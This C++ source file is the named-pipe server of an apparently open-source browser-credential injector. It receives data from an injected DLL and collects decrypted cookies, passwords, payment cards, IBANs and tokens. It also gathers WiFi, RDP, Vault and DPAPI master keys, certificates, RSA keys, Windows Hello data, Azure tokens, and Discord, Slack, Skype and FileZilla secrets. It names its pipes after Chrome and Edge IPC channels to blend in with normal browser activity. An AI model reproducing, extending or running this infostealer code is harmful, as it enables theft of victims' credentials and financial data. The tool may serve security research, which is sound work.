// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "pipe_server.hpp"
#include "../core/console.hpp"
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>
#include <fstream>
#include <iomanip>

namespace Injector {

    PipeServer::PipeServer(const std::wstring& browserType)
        : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {
    }

    void PipeServer::Create() {
        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
            1, 4096, 4096, 0, nullptr));

        if (!m_hPipe) {
            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
        }
    }

    void PipeServer::WaitForClient() {
        if (!ConnectNamedPipe(m_hPipe.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
            throw std::runtime_error("ConnectNamedPipe failed: " + std::to_string(GetLastError()));
        }
    }

    void PipeServer::SendConfig(bool verbose, bool fingerprint, const std::filesystem::path& output) {
        Write(verbose ? "VERBOSE_TRUE" : "VERBOSE_FALSE");
        Sleep(10);
        Write(fingerprint ? "FINGERPRINT_TRUE" : "FINGERPRINT_FALSE");
        Sleep(10);
        Write(output.string());
        Sleep(10);
        m_browserName = Core::ToUtf8(m_browserType);
        m_outputPath = output.string();
        Write(m_browserName);
        Sleep(10);
    }

    void PipeServer::Write(const std::string& msg) {
        DWORD written = 0;
        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
            throw std::runtime_error("WriteFile failed");
        }
    }

    std::string PipeServer::EscapeJson(const std::string& s) {
        std::ostringstream o;
        for (char c : s) {
            if (c == '"') o << "\\\"";
            else if (c == '\\') o << "\\\\";
            else if (c == '\n') o << "\\n";
            else if (c == '\r') o << "\\r";
            else if (c == '\t') o << "\\t";
            else if ('\x00' <= c && c <= '\x1f') o << "\\u" << std::hex << std::setw(4) << std::setfill('0') << (int)c;
            else o << c;
        }
        return o.str();
    }

    void PipeServer::ProcessMessages(bool verbose) {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[4096];
        bool completed = false;
        DWORD startTime = GetTickCount();

        Core::Console console(verbose);
        m_extraSecretsArray = json::array();

        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                break;
            }

            if (available == 0) {
                Sleep(100);
                continue;
            }

            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                continue;
            }

            accumulated.append(buffer, read);

            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;

                if (msg == completionSignal) {
                    completed = true;
                    break;
                }

                // ---- original browser data messages ----
                if (msg.rfind("DEBUG:", 0) == 0) {
                    console.Debug(msg.substr(6));
                }
                else if (msg.rfind("PROFILE:", 0) == 0) {
                    console.ProfileHeader(msg.substr(8));
                    m_stats.profiles++;
                }
                else if (msg.rfind("KEY:", 0) == 0) {
                    console.KeyDecrypted(msg.substr(4));
                }
                else if (msg.rfind("NO_ABE:", 0) == 0) {
                    console.NoAbeWarning(msg.substr(7));
                    m_stats.noAbe = true;
                }
                else if (msg.rfind("ASTER_KEY:", 0) == 0) {
                    console.AsterKeyDecrypted(msg.substr(10));
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                        console.ExtractionResult("Cookies", count, total);
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                    console.ExtractionResult("Passwords", count);
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                    console.ExtractionResult("Cards", count);
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                    console.ExtractionResult("IBANs", count);
                }
                else if (msg.rfind("TOKENS:", 0) == 0) {
                    int count = std::stoi(msg.substr(7));
                    m_stats.tokens += count;
                    console.ExtractionResult("Tokens", count);
                }
                else if (msg.rfind("DATA:", 0) == 0) {
                    std::string data = msg.substr(5);
                    size_t sep = data.find('|');
                    if (sep != std::string::npos) {
                        console.DataRow(data.substr(0, sep), data.substr(sep + 1));
                    }
                }
                // ---- extra secrets ----
                else if (msg.rfind("WIFI:", 0) == 0) {
                    size_t sep = msg.find('|', 5);
                    std::string ssid = msg.substr(5, sep - 5);
                    std::string pw = msg.substr(sep + 1);
                    console.Debug("WiFi: " + ssid + " -> " + pw);
                    m_extraSecretsArray.push_back({
                        {"type", "WiFi"},
                        {"ssid", EscapeJson(ssid)},
                        {"password", EscapeJson(pw)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("DPAPI_CRED:", 0) == 0) {
                    size_t sep = msg.find('|', 11);
                    std::string name = msg.substr(11, sep - 11);
                    std::string data = msg.substr(sep + 1);
                    console.Debug("DPAPI Cred: " + name);
                    m_extraSecretsArray.push_back({
                        {"type", "DPAPI_Credential"},
                        {"file", EscapeJson(name)},
                        {"data", EscapeJson(data)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("VAULT:", 0) == 0) {
                    size_t sep = msg.find('|', 6);
                    std::string name = msg.substr(6, sep - 6);
                    std::string data = msg.substr(sep + 1);
                    console.Debug("Vault: " + name + " -> " + data);
                    m_extraSecretsArray.push_back({
                        {"type", "Vault"},
                        {"file", EscapeJson(name)},
                        {"data", EscapeJson(data)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("RAS:", 0) == 0) {
                    size_t sep = msg.find('|', 4);
                    std::string entry = msg.substr(4, sep - 4);
                    std::string data = msg.substr(sep + 1);
                    console.Debug("RAS: " + entry + " -> " + data);
                    m_extraSecretsArray.push_back({
                        {"type", "RAS"},
                        {"entry", EscapeJson(entry)},
                        {"password", EscapeJson(data)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("CERT:", 0) == 0) {
                    size_t sep = msg.find('|', 5);
                    std::string subj = msg.substr(5, sep - 5);
                    std::string hex = msg.substr(sep + 1);
                    console.Debug("Certificate: " + subj + " -> " + hex.substr(0, 40) + "...");
                    m_extraSecretsArray.push_back({
                        {"type", "Certificate"},
                        {"subject", EscapeJson(subj)},
                        {"pfx_hex", hex},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("RSA_KEY:", 0) == 0) {
                    size_t sep = msg.find('|', 8);
                    std::string path = msg.substr(8, sep - 8);
                    std::string data = msg.substr(sep + 1);
                    console.Debug("RSA Key: " + path + " -> " + data.substr(0, 40) + "...");
                    m_extraSecretsArray.push_back({
                        {"type", "RSA_Key"},
                        {"path", EscapeJson(path)},
                        {"data", EscapeJson(data)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("DISCORD:", 0) == 0) {
                    console.Debug("Discord token: " + msg.substr(8));
                    m_extraSecretsArray.push_back({
                        {"type", "Discord"},
                        {"token", EscapeJson(msg.substr(8))},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("SLACK:", 0) == 0) {
                    console.Debug("Slack token: " + msg.substr(6));
                    m_extraSecretsArray.push_back({
                        {"type", "Slack"},
                        {"token", EscapeJson(msg.substr(6))},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("FILEZILLA:", 0) == 0) {
                    console.Debug("FileZilla password: " + msg.substr(10));
                    m_extraSecretsArray.push_back({
                        {"type", "FileZilla"},
                        {"password", EscapeJson(msg.substr(10))},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("SKYPE:", 0) == 0) {
                    console.Debug("Skype token: " + msg.substr(6));
                    m_extraSecretsArray.push_back({
                        {"type", "Skype"},
                        {"token", EscapeJson(msg.substr(6))},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("RDP_HISTORY:", 0) == 0) {
                    size_t sep = msg.find('|', 12);
                    std::string server = msg.substr(12, sep - 12);
                    std::string username = msg.substr(sep + 1);
                    console.Debug("RDP History: " + server + " -> " + username);
                    m_extraSecretsArray.push_back({
                        {"type", "RDP_History"},
                        {"server", EscapeJson(server)},
                        {"username", EscapeJson(username)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("RDP_FILE:", 0) == 0) {
                    size_t sep = msg.find('|', 9);
                    std::string filepath = msg.substr(9, sep - 9);
                    std::string password = msg.substr(sep + 1);
                    console.Debug("RDP File: " + filepath + " -> " + password);
                    m_extraSecretsArray.push_back({
                        {"type", "RDP_FilePassword"},
                        {"file", EscapeJson(filepath)},
                        {"password", EscapeJson(password)},
                        {"browser", m_browserName}
                        });
                }
                else if (msg.rfind("RDP_CRED:", 0) == 0) {
                    std::string content = msg.substr(9);
                    size_t sep1 = content.find('|');
                    size_t sep2 = content.find('|', sep1 + 1);
                    if (sep1 != std::string::npos && sep2 != std::string::npos) {
                        std::string server = content.substr(0, sep1);
                        std::string username = content.substr(sep1 + 1, sep2 - sep1 - 1);
                        std::string password = content.substr(sep2 + 1);
                        console.Debug("RDP Credential: " + server + " -> " + username + ":" + password);
                        m_extraSecretsArray.push_back({
                            {"type", "RDP_Credential"},
                            {"server", EscapeJson(server)},
                            {"username", EscapeJson(username)},
                            {"password", EscapeJson(password)},
                            {"browser", m_browserName}
                            });
                    }
                }
                else if (msg.rfind("CERT_PEM:", 0) == 0) {
                    std::string content = msg.substr(9);
                    size_t sep1 = content.find('|');
                    size_t sep2 = content.find('|', sep1 + 1);
                    if (sep1 != std::string::npos && sep2 != std::string::npos) {
                        std::string subject = content.substr(0, sep1);
                        std::string serial = content.substr(sep1 + 1, sep2 - sep1 - 1);
                        std::string pem = content.substr(sep2 + 1);
                        m_extraSecretsArray.push_back({
                            {"type", "Certificate"},
                            {"subject", EscapeJson(subject)},
                            {"serial", serial},
                            {"pem", EscapeJson(pem)},
                            {"browser", m_browserName}
                            });
                    }
                }
                else if (msg.rfind("RSA_KEY_V2:", 0) == 0) {
                    std::string content = msg.substr(11);
                    size_t sep1 = content.find('|');
                    size_t sep2 = content.find('|', sep1 + 1);
                    if (sep1 != std::string::npos && sep2 != std::string::npos) {
                        std::string path = content.substr(0, sep1);
                        std::string keyHex = content.substr(sep1 + 1, sep2 - sep1 - 1);
                        std::string certPem = content.substr(sep2 + 1);
                        m_extraSecretsArray.push_back({
                            {"type", "RSA_Key"},
                            {"path", EscapeJson(path)},
                            {"key_hex", keyHex},
                            {"cert_pem", EscapeJson(certPem)},
                            {"browser", m_browserName}
                            });
                    }
                }
                else if (msg.rfind("USER_MASTER_KEY:", 0) == 0) {
                    std::string content = msg.substr(17);
                    size_t sep1 = content.find('|');
                    size_t sep2 = content.find('|', sep1 + 1);
                    if (sep1 != std::string::npos && sep2 != std::string::npos) {
                        std::string sid = content.substr(0, sep1);
                        std::string guid = content.substr(sep1 + 1, sep2 - sep1 - 1);
                        std::string keyHex = content.substr(sep2 + 1);
                        m_userMasterKeyFound = true;
                        m_extraSecretsArray.push_back({
                            {"type", "UserMasterKey"},
                            {"sid", EscapeJson(sid)},
                            {"guid", EscapeJson(guid)},
                            {"key_hex", keyHex},
                            {"browser", m_browserName}
                            });
                    }
                }
                else if (msg.rfind("MACHINE_MASTER_KEY:", 0) == 0) {
                    std::string content = msg.substr(20);
                    size_t sep = content.find('|');
                    if (sep != std::string::npos) {
                        std::string guid = content.substr(0, sep);
                        std::string keyHex = content.substr(sep + 1);
                        m_machineMasterKeyFound = true;
                        m_extraSecretsArray.push_back({
                            {"type", "MachineMasterKey"},
                            {"guid", EscapeJson(guid)},
                            {"key_hex", keyHex},
                            {"browser", m_browserName}
                            });
                    }
                }
                else if (msg.rfind("WINDOWS_HELLO:", 0) == 0) {
                    std::string content = msg.substr(14);
                    size_t sep = content.find('|');
                    if (sep != std::string::npos) {
                        std::string path = content.substr(0, sep);
                        std::string data = content.substr(sep + 1);
                        m_windowsHelloFound = true;
                        m_extraSecretsArray.push_back({
                            {"type", "WindowsHello"},
                            {"file", EscapeJson(path)},
                            {"data_hex", data},
                            {"browser", m_browserName}
                            });
                    }
                }
                else if (msg.rfind("AZURE_TOKEN:", 0) == 0) {
                    std::string content = msg.substr(12);
                    size_t sep = content.find('|');
                    if (sep != std::string::npos) {
                        std::string path = content.substr(0, sep);
                        std::string data = content.substr(sep + 1);
                        m_azureTokenFound = true;
                        m_extraSecretsArray.push_back({
                            {"type", "AzureToken"},
                            {"source", EscapeJson(path)},
                            {"data", EscapeJson(data)},
                            {"browser", m_browserName}
                            });
                    }
                }
                // ---- errors / warnings ----
                else if (msg.rfind("[-]", 0) == 0) {
                    console.Error(msg.substr(4));
                }
                else if (msg.rfind("[!]", 0) == 0) {
                    console.Warn(msg.substr(4));
                }
                // fallback for any other non‑empty message (verbose only)
                else if (verbose && !msg.empty()) {
                    console.Debug(msg);
                }
            }
            accumulated.erase(0, start);
        }

        // Store browser stats for later retrieval
        m_browserData.name = m_browserName;
        m_browserData.cookies = m_stats.cookies;
        m_browserData.cookiesTotal = m_stats.cookiesTotal;
        m_browserData.passwords = m_stats.passwords;
        m_browserData.cards = m_stats.cards;
        m_browserData.ibans = m_stats.ibans;
        m_browserData.tokens = m_stats.tokens;
        m_browserData.profiles = m_stats.profiles;
        m_browserData.noAbe = m_stats.noAbe;
        m_browserData.extraSecrets = m_extraSecretsArray;
    }

    std::string PipeServer::GetBrowserDataAsJson() const {
        json browserJson;
        browserJson["name"] = m_browserName;
        browserJson["extraction_stats"] = {
            {"cookies", m_stats.cookies},
            {"cookies_total", m_stats.cookiesTotal},
            {"passwords", m_stats.passwords},
            {"cards", m_stats.cards},
            {"ibans", m_stats.ibans},
            {"tokens", m_stats.tokens},
            {"profiles", m_stats.profiles},
            {"no_abe", m_stats.noAbe}
        };

        return browserJson.dump(2);
    }

    json PipeServer::GetExtraSecretsJson() const {
        return m_extraSecretsArray;
    }

    std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        DWORD tick = GetTickCount();

        DWORD id1 = (pid ^ tick) & 0xFFFF;
        DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
        DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;

        std::wstring pipeName = L"\\\\.\\pipe\\";
        std::wstring lower = browserType;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);

        wchar_t buffer[128];

        if (lower == L"chrome" || lower == L"chrome-beta") {
            static const wchar_t* patterns[] = {
                L"chrome.sync.%u.%u.%04X",
                L"chrome.nacl.%u_%04X",
                L"mojo.%u.%u.%04X.chrome"
            };
            swprintf_s(buffer, patterns[(id1 + id2) % 3], id1, id2, id3);
        }
        else if (lower == L"edge") {
            static const wchar_t* patterns[] = {
                L"msedge.sync.%u.%u",
                L"msedge.crashpad_%u_%04X",
                L"LOCAL\\msedge_%u"
            };
            swprintf_s(buffer, patterns[(id2 + id3) % 3], id1, id2);
        }
        else {
            swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
        }

        pipeName += buffer;
        return pipeName;
    }

}  // namespace Injector
